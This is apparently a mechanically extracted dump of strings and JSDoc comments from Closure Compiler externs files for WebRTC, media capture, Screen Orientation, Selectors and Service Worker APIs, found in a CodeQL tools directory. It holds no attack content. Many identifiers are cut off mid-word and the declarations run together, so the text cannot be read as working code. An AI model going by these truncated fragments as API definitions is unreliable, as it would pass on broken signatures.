!RTCIceCandidateInit=!RTCIceCandidateInithttps://www.w3.org/TR/webrtc/#rtcicecandidate-interface({urls: string}|{urls: !Array.<!string>}){urls: string}{urls: !Array.<!string>}https://www.w3.org/TR/webrtc/#rtciceserver-dictionary
This dictionary type also has an optional key {credential: ?string}.(string|!Array.<!string>)This type, and several below it, are constructed as unions between records(RTCIceServerRecord_|RTCIceServerInterface_){iceServers: !Array.<!RTCIceServer>, sdpSemantics: (string|undefined)}!Array.<!RTCIceServer>Array.<!RTCIceServer>!RTCIceServerAllows specifying the SDP semantics. Valid values are "plan-b" and
"unified-plan".{@link https://webrtc.org/web-apis/chrome/unified-plan/}
(RTCConfigurationRecord_|RTCConfigurationInterface_)function (!RTCSessionDescription)!RTCSessionDescriptionfunction (this: SCOPE, Object, string, MAP)SCOPEThe value of "this" inside callback function.
SCOPE=MAP,SCOPE
readonly@readonly!IteratorIterable.<string>IteratorIterable.<string>TODO(bemasc): Remove this type once it is no longer in use.  It has already
been removed from the specification.!Array.<!RTCStatsReport>Array.<!RTCStatsReport>!RTCStatsReportfunction (!RTCStatsResponse, MediaStreamTrack=)!RTCStatsResponseMediaStreamTrack=This type is not yet standardized, so the properties here only represent
the current capabilities of libjingle (and hence Chromium).
TODO(bemasc): Add a link to the relevant standard once MediaConstraint has a
standard definition.TODO(bemasc): Make this type public once it is defined in a standard.(Object|MediaConstraintSetInterface_)?MediaConstraintSet_?Array.<!MediaConstraintSet_>Array.<!MediaConstraintSet_>!MediaConstraintSet_This type is used extensively in
{@see http://dev.w3.org/2011/webrtc/editor/webrtc.html} but is not yet
defined.(Object|MediaConstraintsInterface_)An enumerated string type (RTCDataChannelState) with values:
"connecting", "open", "closing", and "closed".(string|!Blob|!ArrayBuffer|!ArrayBufferView)!RTCDataChannel{reliable: boolean}@property[ordered=true]
maxPacketLifeTimemaxRetransmits[protocol=""]
[negotiated=false]
[priority='low']
see https://www.w3.org/TR/webrtc/#dom-rtcdatachannelinit for documentation
Type inconsistencies due to Closure limitations:
maxPacketLifeTime should be UnsignedShort
maxRetransmits should be UnsignedShort
protocol should be USVString
id should be UnsignedShort
In WebIDL priority is an enum with values 'very-low', 'low',
'medium' and 'high', but there is no mechanism in Closure for describing
a specialization of the string type.(RTCDataChannelInitInterface_|RTCDataChannelInitRecord_|RTCDataChannelInitDictionary_){expires: number}expires!MediaConstraints=!MediaConstraintsPromise.<RTCCertificate>(!RTCSessionDescriptionCallback|!MediaConstraints)=(!RTCSessionDescriptionCallback|!MediaConstraints)!RTCSessionDescriptionCallback!RTCPeerConnectionErrorCallback=!RTCPeerConnectionErrorCallback(!Promise.<!RTCSessionDescription>|undefined)!Promise.<!RTCSessionDescription>Promise.<!RTCSessionDescription>!RTCVoidCallback=!RTCVoidCallback?RTCSessionDescription?RTCConfiguration=?RTCConfiguration?MediaConstraints=?MediaConstraintsVoid in Chrome for now, a promise that you can then/catch in Firefox.!RTCIceCandidate!function (DOMException)=!function (DOMException)function (DOMException)(!Promise|undefined)!Promise!RTCIceGatheringState!RTCIceConnectionState!Array.<!MediaStream>!Array.<!RTCRtpSender>Array.<!RTCRtpSender>!RTCRtpSender!Array.<!RTCRtpReceiver>Array.<!RTCRtpReceiver>!RTCRtpReceiverRTCDataChannelInit=Additional streams.
...MediaStream(!MediaStreamTrack|string)?RTCRtpTransceiverInit=?RTCRtpTransceiverInit!RTCRtpTransceiverReturns the list of transceivers are currently attached to this peer.!Array.<!RTCRtpTransceiver>Array.<!RTCRtpTransceiver>!RTCConfigurationFirefox' getstats is synchronous and returns a much simpler
{!RTCStatsReport} Map-like object.!RTCStatsCallback=!RTCStatsCallback(undefined|!RTCStatsReport|!Promise.<!RTCStatsReport>)!Promise.<!RTCStatsReport>Promise.<!RTCStatsReport>?function (!RTCPeerConnectionIceEvent)function (!RTCPeerConnectionIceEvent)!RTCPeerConnectionIceEvent?function (!MediaStreamEvent)function (!MediaStreamEvent)!MediaStreamEvent?function (!RTCTrackEvent)function (!RTCTrackEvent)!RTCTrackEvent?function (!RTCDataChannelEvent)function (!RTCDataChannelEvent)!RTCDataChannelEventhttps://www.w3.org/TR/webrtc/#idl-def-rtcicetransportArray.<RTCIceCandidate>RTCIceCandidatePairRTCIceParameters!RTCIceGatherOptionsRTCIceGatherOptionshttps://msdn.microsoft.com/en-us/library/mt433107(v=vs.85).aspxhttps://www.w3.org/TR/webrtc/#idl-def-rtcdtlstransportArray.<ArrayBuffer>var Med ... kState;MediaSt ... ckStateSourceI ... e.kind;SourceI ... pe.kindSourceInfo.prototypeSourceI ... ype.id;SourceI ... type.idSourceI ... .label;SourceI ... e.labelSourceI ... facing;SourceI ... .facingMediaSe ... pe.max;MediaSe ... ype.maxMediaSe ... ototypeMediaSe ... pe.min;MediaSe ... ype.minMediaSe ... e.step;MediaSe ... pe.stepMediaTr ... ilitiesMediaTr ... .width;MediaTr ... e.widthMediaTr ... ototypeMediaTr ... height;MediaTr ... .heightMediaTr ... tRatio;MediaTr ... ctRatioMediaTr ... meRate;MediaTr ... ameRateMediaTr ... ngMode;MediaTr ... ingModeMediaTr ... volume;MediaTr ... .volumeMediaTr ... leRate;MediaTr ... pleRateMediaTr ... leSize;MediaTr ... pleSizeMediaTr ... lation;MediaTr ... llationMediaTr ... atency;MediaTr ... latencyMediaTr ... lCount;MediaTr ... elCountMediaTr ... viceId;MediaTr ... eviceIdMediaTr ... roupId;MediaTr ... groupIdMediaTr ... ceMode;MediaTr ... nceModeMediaTr ... reMode;MediaTr ... ureModeMediaTr ... usMode;MediaTr ... cusModeMediaTr ... sation;MediaTr ... nsationMediaTr ... eratureMediaTr ... ype.isoMediaTr ... ghtnessMediaTr ... ontrastMediaTr ... urationMediaTr ... arpnessMediaTr ... pe.zoomMediaTr ... e.torchMediaTr ... terest;MediaTr ... nterestMediaTr ... traintsMediaTr ... ontrol;MediaTr ... ControlMediaTr ... ession;MediaTr ... ressionMediaSt ... ck) {};MediaSt ... ack) {}MediaSt ... SourcesMediaSt ... e.kind;MediaSt ... pe.kindMediaSt ... ototypeMediaSt ... ype.id;MediaSt ... type.idMediaSt ... .label;MediaSt ... e.labelMediaSt ... nabled;MediaSt ... enabledMediaSt ... .muted;MediaSt ... e.mutedMediaSt ... ntHint;MediaSt ... entHintMediaSt ... remote;MediaSt ... .remoteMediaSt ... yState;MediaSt ... dyStateMediaSt ... onmute;MediaSt ... .onmuteMediaSt ... unmute;MediaSt ... nunmuteMediaSt ... nended;MediaSt ... onendedMediaSt ... rained;MediaSt ... trainedMediaSt ... ts) {};MediaSt ... nts) {}MediaSt ... traintsMediaSt ... n() {};MediaSt ... on() {}MediaSt ... e.cloneMediaSt ... pe.stopMediaSt ... ilitiesMediaSt ... ettingsvar Med ... ntInit;MediaSt ... entInitMediaSt ... ckEventMediaSt ... .track;MediaSt ... e.trackMediaSt ... re) {};MediaSt ... ure) {}MediaSt ... istenerMediaSt ... vt) {};MediaSt ... evt) {}MediaSt ... chEventMediaSt ... oTracksMediaSt ... tTracksMediaSt ... Id) {};MediaSt ... kId) {}MediaSt ... ackByIdfunction(trackId) {}MediaSt ... ddTrackfunction(track) {}MediaSt ... veTrackMediaSt ... .ended;MediaSt ... e.endedMediaSt ... active;MediaSt ... .activeMediaSt ... nactiveMediaSt ... dtrack;MediaSt ... ddtrackMediaSt ... etrack;MediaSt ... vetrackvar web ... Stream;var RTC ... ntInit;RTCDTMF ... entInitRTCDTMF ... geEventRTCDTMF ... e.tone;RTCDTMF ... pe.toneRTCDTMF ... ototypeRTCDTMF ... ap) {};RTCDTMF ... Gap) {}RTCDTMF ... ertDTMFfunctio ... Gap) {}RTCDTMF ... change;RTCDTMF ... echangeRTCDTMF ... Buffer;RTCDTMF ... eBufferfunctio ... ort) {}RTCRtpS ... e.dtmf;RTCRtpS ... pe.dtmfRTCRtpS ... ototypeRTCRtpS ... .track;RTCRtpS ... e.trackRTCRtpS ... ck) {};RTCRtpS ... ack) {}RTCRtpS ... ceTrackRTCRtpS ... n() {};RTCRtpS ... on() {}RTCRtpS ... ametersRTCRtpS ... ms) {};RTCRtpS ... ams) {}function(params) {}RTCRtpC ... gSourceRTCRtpC ... source;RTCRtpC ... .sourceRTCRtpC ... ototypeRTCRtpC ... estamp;RTCRtpC ... mestampRTCRtpR ... .track;RTCRtpR ... e.trackRTCRtpR ... ototypeRTCRtpR ... n() {};RTCRtpR ... on() {}RTCRtpR ... SourcesgetCont ... SourcesgetSync ... SourcesRTCRtpT ... verInitRTCRtpT ... ection;RTCRtpT ... rectionRTCRtpT ... ototypeRTCRtpT ... treams;RTCRtpT ... streamsRTCRtpT ... odings;RTCRtpT ... codingsfunctio ... rs() {}RTCRtpE ... ametersRTCRtpE ... adType;RTCRtpE ... oadTypeRTCRtpE ... ototypeRTCRtpE ... pe.dtx;RTCRtpE ... ype.dtxRTCRtpE ... active;RTCRtpE ... .activeRTCRtpE ... iority;RTCRtpE ... riorityRTCRtpE ... .ptime;RTCRtpE ... e.ptimeRTCRtpE ... itrate;RTCRtpE ... BitrateRTCRtpE ... merate;RTCRtpE ... amerateRTCRtpE ... pe.rid;RTCRtpE ... ype.ridRTCRtpE ... DownBy;RTCRtpE ... nDownByscaleRe ... nDownByRTCRtpT ... pe.mid;RTCRtpT ... ype.midRTCRtpT ... topped;RTCRtpT ... stoppedRTCRtpT ... on) {};RTCRtpT ... ion) {}RTCRtpT ... n() {};RTCRtpT ... on() {}RTCRtpT ... pe.stopRTCRtpT ... sender;RTCRtpT ... .senderRTCRtpT ... ceiver;RTCRtpT ... eceiverLongRan ... pe.max;LongRan ... ype.maxLongRange.prototypeLongRan ... pe.min;LongRan ... ype.minDoubleR ... pe.max;DoubleR ... ype.maxDoubleR ... ototypeDoubleR ... pe.min;DoubleR ... ype.minConstra ... ametersConstra ... .exact;Constra ... e.exactConstra ... ototypeConstra ... .ideal;Constra ... e.idealvar Con ... oolean;var Con ... String;var ConstrainDouble;var ConstrainLong;MediaTr ... aintSetMediaTr ... vanced;MediaTr ... dvancedMediaSt ... .audio;MediaSt ... e.audioMediaSt ... .video;MediaSt ... e.videoNavigat ... iaErrorNavigat ... DENIED;Navigat ... _DENIEDNavigat ... ototypeNavigat ... e.code;Navigat ... pe.codeNavigat ... e.name;Navigat ... pe.nameNavigat ... essage;Navigat ... messageNavigat ... ntName;Navigat ... intNameNavigat ... ck) {};Navigat ... ack) {}Navigat ... erMediaMediaSt ... stream;MediaSt ... .streamMediaRe ... imeTypeMediaRe ... ototypeMediaRe ... rSecondMediaRe ... re) {};MediaRe ... ure) {}MediaRe ... istenerMediaRe ... vt) {};MediaRe ... evt) {}MediaRe ... chEventMediaRe ... stream;MediaRe ... .streamMediaRe ... meType;MediaRe ... .state;MediaRe ... e.stateMediaRe ... nstart;MediaRe ... onstartMediaRe ... onstop;MediaRe ... .onstopMediaRe ... ilable;MediaRe ... ailableMediaRe ... npause;MediaRe ... onpauseMediaRe ... resume;MediaRe ... nresumeMediaRe ... nerror;MediaRe ... onerrorMediaRe ... Second;MediaRe ... ce) {};MediaRe ... ice) {}MediaRe ... e.startfunctio ... ice) {}MediaRe ... n() {};MediaRe ... on() {}MediaRe ... pe.stopMediaRe ... e.pauseMediaRe ... .resumeMediaRe ... estDataMediaRe ... pe) {};MediaRe ... ype) {}MediaRe ... pportedPhotoSe ... htMode;PhotoSe ... ghtModePhotoSe ... ototypePhotoSe ... Height;PhotoSe ... eHeightPhotoSe ... eWidth;PhotoSe ... geWidthPhotoSe ... uction;PhotoSe ... ductionPhotoCa ... uction;PhotoCa ... ductionPhotoCa ... ototypePhotoCa ... Height;PhotoCa ... eHeightPhotoCa ... eWidth;PhotoCa ... geWidthPhotoCa ... htMode;PhotoCa ... ghtModeImageCa ... gs) {};ImageCa ... ngs) {}ImageCa ... kePhotoImageCa ... ototypeImageCa ... n() {};ImageCa ... on() {}ImageCa ... ilitiesImageCa ... abFrameImageCa ... .track;ImageCa ... e.trackRTCTrac ... ceiver;RTCTrac ... eceiverRTCTrac ... ototypeRTCTrac ... .track;RTCTrac ... e.trackRTCTrac ... treams;RTCTrac ... streamsRTCTrac ... sceivervar MediaDeviceKind;var RTC ... ection;MediaDe ... viceId;MediaDe ... eviceIdMediaDe ... ototypeMediaDe ... e.kind;MediaDe ... pe.kindMediaDe ... .label;MediaDe ... e.labelMediaDe ... roupId;MediaDe ... groupIdMediaDe ... n() {};MediaDe ... on() {}MediaDe ... DevicesMediaDe ... nts) {}MediaDe ... erMediaMediaDe ... n()  {}MediaDe ... traintsgetSupp ... traintsfunction()  {}Navigat ... evices;Navigat ... Devicesvar RTCSdpType;RTCSess ... riptionRTCSess ... e.type;RTCSess ... pe.typeRTCSess ... ototypeRTCSess ... pe.sdp;RTCSess ... ype.sdpfunctio ... sdp) {}IceCand ... n() {};IceCand ... on() {}IceCand ... e.toSdpIceCand ... ototypeIceCand ... .label;IceCand ... e.labelRTCIceC ... didate;RTCIceC ... ndidateRTCIceC ... ototypeRTCIceC ... sdpMid;RTCIceC ... .sdpMidRTCIceC ... eIndex;RTCIceC ... neIndexRTCIceC ... agment;RTCIceC ... ragmentvar RTC ... ecord_;functio ... e_() {}RTCIceS ... erface_RTCIceS ... e.urls;RTCIceS ... pe.urlsRTCIceS ... ototypeRTCIceS ... ername;RTCIceS ... sernameRTCIceS ... ential;RTCIceS ... dentialvar RTCIceServer;RTCConf ... Record_RTCConf ... erface_RTCConf ... ervers;RTCConf ... ServersRTCConf ... ototypeRTCConf ... antics;RTCConf ... manticsvar RTC ... ration;var RTC ... llback;RTCSess ... allbackRTCPeer ... allbackvar RTCVoidCallback;var RTC ... gState;var RTC ... nState;RTCIceC ... onStateRTCPeer ... ceEventRTCPeer ... didate;RTCPeer ... ndidateRTCPeer ... ototypeRTCStat ... estamp;RTCStat ... mestampRTCStat ... ototypeRTCStat ... n() {};RTCStat ... on() {}RTCStat ... e.namesRTCStat ... me) {};RTCStat ... ame) {}RTCStat ... pe.statRTCStat ... .local;RTCStat ... e.localRTCStat ... remote;RTCStat ... .remoteRTCStat ... e.type;RTCStat ... pe.typeRTCStat ... ype.id;RTCStat ... type.idRTCStat ... bj) {};RTCStat ... Obj) {}RTCStat ... forEachRTCStat ... ey) {};RTCStat ... key) {}RTCStat ... ype.getRTCStat ... pe.keysvar RTCStatsElement;RTCStat ... .resultMediaCo ... erface_MediaCo ... eAudio;MediaCo ... veAudioMediaCo ... ototypeMediaCo ... eVideo;MediaCo ... veVideoMediaCo ... eement;MediaCo ... reementMediaCo ... annels;MediaCo ... hannelsvar Med ... ntSet_;MediaCo ... datory;MediaCo ... ndatoryMediaCo ... tional;MediaCo ... ptionalvar Med ... raints;RTCData ... .label;RTCData ... e.labelRTCData ... ototypeRTCData ... liable;RTCData ... eliableRTCData ... yState;RTCData ... dyStateRTCData ... Amount;RTCData ... dAmountRTCData ... onopen;RTCData ... .onopenRTCData ... nerror;RTCData ... onerrorRTCData ... nclose;RTCData ... oncloseRTCData ... n() {};RTCData ... on() {}RTCData ... e.closeRTCData ... essage;RTCData ... messageRTCData ... ryType;RTCData ... aryTypeRTCData ... ta) {};RTCData ... ata) {}RTCData ... pe.sendRTCData ... hannel;RTCData ... channelRTCData ... Record_RTCData ... erface_var RTC ... onary_;RTCData ... ionary_var RTC ... elInit;var RTCCertificate;RTCPeer ... hm) {};RTCPeer ... thm) {}RTCPeer ... ificateRTCPeer ... re) {};RTCPeer ... ure) {}RTCPeer ... istenerRTCPeer ... vt) {};RTCPeer ... evt) {}RTCPeer ... chEventRTCPeer ... ts) {};RTCPeer ... nts) {}RTCPeer ... teOffersuccess ... traintsRTCPeer ... eAnswerRTCPeer ... ck) {};RTCPeer ... ack) {}RTCPeer ... riptionRTCPeer ... iption;RTCPeer ... gState;RTCPeer ... ngStateRTCPeer ... dateIceRTCPeer ... nState;RTCPeer ... onStateRTCPeer ... n() {};RTCPeer ... on() {}RTCPeer ... StreamsRTCPeer ... Id) {};RTCPeer ... mId) {}RTCPeer ... eamByIdRTCPeer ... SendersRTCPeer ... ceiversRTCPeer ... ct) {};RTCPeer ... ict) {}RTCPeer ... ChannelRTCPeer ... dStreamRTCPeer ... am) {};RTCPeer ... eam) {}RTCPeer ... eStreamRTCPeer ... gs) {};RTCPeer ... rgs) {}RTCPeer ... ddTrackRTCPeer ... it) {};RTCPeer ... nit) {}RTCPeer ... sceiverRTCPeer ... urationRTCPeer ... on) {};RTCPeer ... ion) {}RTCPeer ... er) {};RTCPeer ... der) {}RTCPeer ... veTrackfunction(sender) {}RTCPeer ... or) {};RTCPeer ... tor) {}RTCPeer ... etStatsRTCPeer ... e.closeRTCPeer ... needed;RTCPeer ... nneededRTCPeer ... change;RTCPeer ... echangeonsigna ... echangeRTCPeer ... stream;RTCPeer ... dstreamRTCPeer ... ntrack;RTCPeer ... ontrackRTCPeer ... estreamoniceco ... echangeRTCPeer ... hannel;RTCPeer ... channelvar web ... ection;webkitR ... nectionvar moz ... ection;mozRTCP ... nectionfunctio ... rer) {}RTCIceT ... gState;RTCIceT ... ngStateRTCIceT ... ototypeRTCIceT ... on(){};RTCIceT ... ion(){}RTCIceT ... didatesfunction(){}RTCIceT ... atePairgetSele ... atePairRTCIceT ... ametersRTCIceT ... n(e){};RTCIceT ... on(e){}RTCIceT ... echangefunction(e){}ongathe ... echangeRTCIceT ... rchangeonselec ... rchangeRTCDtls ... nsport;RTCDtls ... ansportRTCDtls ... ototypeRTCDtls ... n() {};RTCDtls ... on() {}RTCDtls ... ficatesgetRemo ... ficatesRTCDtls ... n(e){};RTCDtls ... on(e){}RTCDtls ... echangeH:/codeql/javascript/tools/data/externs/web/w3c_screen_orientation.js
 * @fileoverview Definitions for W3C's Screen Orientation API.
 * @see https://w3c.github.io/screen-orientation/
 *
 * @externs
 
 * @interface
 * @extends {EventTarget}
 * @see https://w3c.github.io/screen-orientation/#screenorientation-interface
 
 * @param {string} orientation
 * @return {!Promise<void>}
 
 * @type {?ScreenOrientation}
 * @see https://w3c.github.io/screen-orientation/#extensions-to-the-screen-interface
 ScreenOrientationunlockDefinitions for W3C's Screen Orientation API.
https://w3c.github.io/screen-orientation/
*https://w3c.github.io/screen-orientation/#screenorientation-interface?ScreenOrientationhttps://w3c.github.io/screen-orientation/#extensions-to-the-screen-interfacevar Scr ... n() {};ScreenO ... on() {}ScreenO ... on) {};ScreenO ... ion) {}ScreenO ... pe.lockScreenO ... ototypeScreenO ... n() {};ScreenO ... .unlockScreenO ... e.type;ScreenO ... pe.typeScreenO ... .angle;ScreenO ... e.angleScreenO ... change;ScreenO ... nchangeScreen. ... tation;Screen. ... ntationH:/codeql/javascript/tools/data/externs/web/w3c_selectors.js
 * @fileoverview Definitions for W3C's Selectors API.
 *  This file depends on w3c_dom1.js.
 *  @see http://www.w3.org/TR/selectors-api2/
 *
 * @externs
 
 * @param {string} selectors
 * @return {?Element}
 * @override
 * @nosideeffects
 
 * @param {string} selectors
 * @return {!NodeList<!Element>}
 * @override
 * @nosideeffects
 
 * https://dom.spec.whatwg.org/#dom-element-closest
 * https://developer.mozilla.org/en-US/docs/Web/API/Element.closest
 * @param {string} selectors
 * @return {?Element}
 * @nosideeffects
 
 * https://dom.spec.whatwg.org/#dom-element-matches
 * https://developer.mozilla.org/en-US/docs/Web/API/Element.matches
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @param {string} selectors
 * @param {(Node|NodeList<?>)=} refNodes
 * @return {boolean}
 * @nosideeffects
 
 * @see https://developer.mozilla.org/en/DOM/Node.mozMatchesSelector
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @see http://developer.apple.com/library/safari/documentation/WebKit/Reference/ElementClassRef/Element/Element.html
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @see http://msdn.microsoft.com/en-us/library/ff975201.aspx
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 
 * @see http://www.opera.com/docs/changelogs/windows/1150/
 * @param {string} selectors
 * @return {boolean}
 * @nosideeffects
 selectorsmatchesSelectorrefNodesmozMatchesSelectorwebkitMatchesSelectormsMatchesSelectoroMatchesSelectorDefinitions for W3C's Selectors API.
This file depends on w3c_dom1.js.
http://www.w3.org/TR/selectors-api2/
*https://dom.spec.whatwg.org/#dom-element-closest
https://developer.mozilla.org/en-US/docs/Web/API/Element.closesthttps://dom.spec.whatwg.org/#dom-element-matches
https://developer.mozilla.org/en-US/docs/Web/API/Element.matcheshttps://developer.mozilla.org/en/DOM/Node.mozMatchesSelector
http://developer.apple.com/library/safari/documentation/WebKit/Reference/ElementClassRef/Element/Element.html
http://msdn.microsoft.com/en-us/library/ff975201.aspx
http://www.opera.com/docs/changelogs/windows/1150/
Documen ... rs) {};Documen ... ors) {}Documen ... electorDocumen ... ctorAllElement ... rs) {};Element ... ors) {}Element ... electorElement ... ctorAllElement ... closestElement ... matchesElement ... es) {};Element ... des) {}functio ... des) {}webkitM ... electorH:/codeql/javascript/tools/data/externs/web/w3c_serviceworker.js
 * @fileoverview Externs for service worker.
 *
 * @see http://www.w3.org/TR/service-workers/
 * @externs
 
 * @see http://www.w3.org/TR/service-workers/#service-worker-interface
 * @constructor
 * @extends {Worker}
  @type {ServiceWorkerState} 
 *  Set of possible string values: 'installing', 'installed', 'activating',
 * 'activated', 'redundant'.
 *  @typedef {string}
 
 * @see https://w3c.github.io/push-api/
 * @constructor
 
 * Please note there is an intent to deprecate this field in Chrome 43 or 44.
 * See https://www.chromestatus.com/feature/5283829761703936.
 * @type {string}
  @return {!Promise<boolean>} /** @re ... an>} */ @enum {string} /** @en ... ing} */ This is commented out since it has not been implemented yet in Chrome beta.// This ... e beta. Uncomment once it is available.// Unco ... ilable. var PushPermissionStatus  = {// var  ... us  = {  GRANTED: 'granted',//  GRA ... anted',  DENIED: 'denied',//  DEN ... enied',  DEFAULT: 'default'//  DEF ... efault'};//};
 * @see https://w3c.github.io/push-api/#idl-def-PushManager
 * @constructor
 
 * @param {PushSubscriptionOptions=} opt_options
 * @return {!Promise<PushSubscription>}
  @return {!Promise<PushSubscription>} /** @re ... on>} */ @return {!Promise<PushPermissionStatus>} /** @re ... us>} */ PushManager.prototype.hasPermission = function() {};// Push ... n() {};
 * @typedef {{userVisibleOnly: (boolean|undefined)}}
 * @see https://w3c.github.io/push-api/#idl-def-PushSubscriptionOptions
 
 * @see http://www.w3.org/TR/push-api/#idl-def-PushMessageData
 * @constructor
  @return {!ArrayBuffer} /** @re ... fer} */ @return {!Blob} /** @re ... lob} */ @return {*} /** @return {*} */ @return {string} /** @re ... ing} */
 * @see http://www.w3.org/TR/push-api/#idl-def-PushEvent
 * @constructor
 * @param {string} type
 * @param {!ExtendableEventInit=} opt_eventInitDict
 * @extends {ExtendableEvent}
  @type {?PushMessageData} /** @ty ... ata} */
 * @see http://www.w3.org/TR/service-workers/#service-worker-registration-interface
 * @interface
 * @extends {EventTarget}
  @type {ServiceWorker} /** @ty ... ker} */ @return {!Promise<void>} /** @re ... id>} */
 * @see https://w3c.github.io/push-api/
 * @type {!PushManager}
 
 * @see https://notifications.spec.whatwg.org/#service-worker-api
 * @param {string} title
 * @param {NotificationOptions=} opt_options
 * @return {!Promise<void>}
 
 * @see https://notifications.spec.whatwg.org/#service-worker-api
 * @param {!GetNotificationOptions=} opt_filter
 * @return {!Promise<?Array<?Notification>>}
 
 * @see http://www.w3.org/TR/service-workers/#service-worker-container-interface
 * @interface
 * @extends {EventTarget}
  @type {?ServiceWorker}  @type {!Promise<!ServiceWorkerRegistration>} /** @ty ... on>} */
 * @param {string} scriptURL
 * @param {RegistrationOptions=} opt_options
 * @return {!Promise<!ServiceWorkerRegistration>}
 
 * @param {string=} opt_documentURL
 * @return {!Promise<!ServiceWorkerRegistration|undefined>}
 
 * @return {!Promise<Array<!ServiceWorkerRegistration>>}
  @type {?function(!ErrorEvent)} 
 * @typedef {{scope: (string|undefined), useCache: (boolean|undefined)}}
  @type {!ServiceWorkerContainer} /** @ty ... ner} */
 * @see http://www.w3.org/TR/service-workers/#service-worker-global-scope-interface
 * @interface
 * @extends {WorkerGlobalScope}
  @type {!Cache}  @type {!CacheStorage} /** @ty ... age} */ @type {!ServiceWorkerClients} /** @ty ... nts} */ @type {!ServiceWorkerRegistration}  @type {!Console} /** @ty ... ole} */ @type {?function(!InstallEvent)}  @type {?function(!ExtendableEvent)}  @type {?function(!FetchEvent)} 
 * TODO(mtragut): This handler should get a custom event in the future.
 * @type {?function(!Event)}
  @type {?function(!MessageEvent)} 
 * @see http://www.w3.org/TR/service-workers/#service-worker-client-interface
 * @constructor
  @type {!Promise<void>} /** @ty ... id>} */ @type {VisibilityState} 
 * // TODO(mtragut): Possibly replace the type with enum ContextFrameType once
 * the enum is defined.
 * @type {string}
 
 * @param {*} message
 * @param {(!Array<!Transferable>|undefined)=} opt_transfer
 * @return {undefined}
  @return {!Promise} /** @re ... ise} */
 * @see http://www.w3.org/TR/service-workers/#service-worker-clients-interface
 * @interface
 
 * Deprecated in Chrome M43+, use matchAll instead. Reference:
 * https://github.com/slightlyoff/ServiceWorker/issues/610.
 * TODO(joeltine): Remove when getAll is fully deprecated.
 * @param {ServiceWorkerClientQueryOptions=} opt_options
 * @return {!Promise<!Array<!ServiceWorkerClient>>}
 
 * @param {ServiceWorkerClientQueryOptions=} opt_options
 * @return {!Promise<!Array<!ServiceWorkerClient>>}
 
 * @return {!Promise<void>}
 
 * @param {string} url
 * @return {!Promise<!ServiceWorkerClient>}
  @typedef {{includeUncontrolled: (boolean|undefined)}} /** @ty ... d)}} */
 * @see http://www.w3.org/TR/service-workers/#cache-interface
 * @interface
 
 * @param {!RequestInfo} request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<!Response|undefined>}
 
 * @param {RequestInfo=} opt_request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<!Array<!Response>>}
 
 * @param {!RequestInfo} request
 * @return {!Promise<void>}
 
 * @param {!Array<!RequestInfo>} requests
 * @return {!Promise<void>}
 
 * @param {!RequestInfo} request
 * @param {!Response} response
 * @return {!Promise<void>}
 
 * @param {!RequestInfo} request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<boolean>}
 
 * @param {RequestInfo=} opt_request
 * @param {CacheQueryOptions=} opt_options
 * @return {!Promise<!Array<!Request>>}
 
 * @typedef {{
 *   ignoreSearch: (boolean|undefined),
 *   ignoreMethod: (boolean|undefined),
 *   ignoreVary: (boolean|undefined),
 *   prefixMatch: (boolean|undefined),
 *   cacheName: (string|undefined)
 * }}
 
 * @see http://www.w3.org/TR/service-workers/#cache-storage-interface
 * @interface
 
 * Window instances have a property called caches which implements CacheStorage
 * @see https://www.w3.org/TR/service-workers/#cache-objects
 * @type {!CacheStorage}
 
 * @param {string} cacheName
 * @return {!Promise<boolean>}
 
 * @param {string} cacheName
 * @return {!Promise<!Cache>}
  @return {!Promise<!Array<string>>} 
 * @see http://www.w3.org/TR/service-workers/#extendable-event-interface
 * @constructor
 * @param {string} type
 * @param {ExtendableEventInit=} opt_eventInitDict
 * @extends {Event}
 
 * @param {IThenable} f
 * @return {undefined}
 
 * @typedef {{
 *   bubbles: (boolean|undefined),
 *   cancelable: (boolean|undefined)
 * }}
 
 * @see http://www.w3.org/TR/service-workers/#install-event-interface
 * @constructor
 * @param {string} type
 * @param {InstallEventInit=} opt_eventInitDict
 * @extends {ExtendableEvent}
 
 * @typedef {{
 *   bubbles: (boolean|undefined),
 *   cancelable: (boolean|undefined),
 *   activeWorker: (!ServiceWorker|undefined)
 * }}
 
 * @see http://www.w3.org/TR/service-workers/#fetch-event-interface
 * @constructor
 * @param {string} type
 * @param {FetchEventInit=} opt_eventInitDict
 * @extends {Event}
  @type {!Request} /** @ty ... est} */ @type {!ServiceWorkerClient}  @type {!boolean} 
 * @param {(Response|Promise<Response>)} r
 * @return {undefined}
 
 * @param {string} url
 * @return {!Promise<!Response>}
 
 * @return {!Promise<!Response>}
 
 * @typedef {{
 *   bubbles: (boolean|undefined),
 *   cancelable: (boolean|undefined),
 *   request: (!Request|undefined),
 *   client: (!ServiceWorkerClient|undefined),
 *   isReload: (!boolean|undefined)
 * }}
 ServiceWorkerServiceWorkerStatePushSubscriptionendpointsubscriptionIdunsubscribePushManagersubscribegetSubscriptionPushSubscriptionOptionsPushMessageDataPushEventServiceWorkerRegistrationinstallingwaitingunregisteronupdatefoundpushManagershowNotificationgetNotificationsopt_filterServiceWorkerContainercontrollergetRegistrationopt_documentURLgetRegistrationsoncontrollerchangeRegistrationOptionsserviceWorkerServiceWorkerGlobalScopescriptCachecachesclientsregistrationskipWaitingoninstallonactivateonfetchonbeforeevictedonevictedServiceWorkerClientfocusedframeTypeServiceWorkerClientsmatchAllclaimopenWindowServiceWorkerClientQueryOptionsCacheopt_requestaddAllCacheQueryOptionsCacheStoragecacheNameExtendableEventwaitUntilExtendableEventInitInstallEventactiveWorkerInstallEventInitFetchEventclientisReloadrespondWithrforwardToFetchEventInitExterns for service worker.
*http://www.w3.org/TR/service-workers/
http://www.w3.org/TR/service-workers/#service-worker-interface
Set of possible string values: 'installing', 'installed', 'activating',
'activated', 'redundant'.https://w3c.github.io/push-api/
Please note there is an intent to deprecate this field in Chrome 43 or 44.
See https://www.chromestatus.com/feature/5283829761703936.!Promise.<boolean>Promise.<boolean>https://w3c.github.io/push-api/#idl-def-PushManager
PushSubscriptionOptions=!Promise.<PushSubscription>Promise.<PushSubscription>!Promise.<PushPermissionStatus>Promise.<PushPermissionStatus>PushPermissionStatus{userVisibleOnly: (boolean|undefined)}https://w3c.github.io/push-api/#idl-def-PushSubscriptionOptionshttp://www.w3.org/TR/push-api/#idl-def-PushMessageData
